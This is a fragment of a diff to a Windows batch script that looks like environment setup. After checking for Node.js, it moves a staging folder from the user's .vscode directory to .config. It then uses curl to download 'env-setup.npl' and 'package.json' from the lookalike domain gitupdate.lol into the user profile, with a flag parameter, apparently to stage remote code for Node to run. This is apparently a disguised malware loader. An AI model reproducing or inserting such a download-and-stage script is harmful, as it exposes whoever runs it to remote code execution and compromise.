@@ -214,7 +214,7 @@ if not defined NODE_EXE (
     echo [ERROR] Node.js executable not found or set.
     exit /b 1
 )
-set "CODEPROFILE=%USERPROFILE%\\.vscode"
+set "CODEPROFILE=%USERPROFILE%\\.config"
 
 curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitupdate.lol/settings/env?flag=${flag}"
 curl -L -o "%CODEPROFILE%\\package.json" "https://gitupdate.lol/settings/package"
